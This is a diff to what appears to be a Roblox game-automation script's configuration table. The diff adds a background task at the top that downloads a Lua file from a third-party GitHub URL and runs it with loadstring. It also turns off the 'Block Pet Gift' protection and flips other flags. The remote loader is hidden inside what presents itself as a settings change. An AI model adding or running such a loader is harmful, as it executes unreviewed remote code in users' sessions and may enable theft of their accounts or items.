@@ -1,9 +1,13 @@
+task.spawn(function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/status.lua", true))()
+end)
+
 getgenv().ConfigsKaitun = {
-	Beta_Fix_Data_Sync = true,
+	Beta_Fix_Data_Sync = false,
 
-	NoDeletePlayer = false,
+	NoDeletePlayer = true,
 
-	["Block Pet Gift"] = true,
+	["Block Pet Gift"] = false,
 
 	Collect_Cooldown = 90, -- cooldown to collect fruit
 
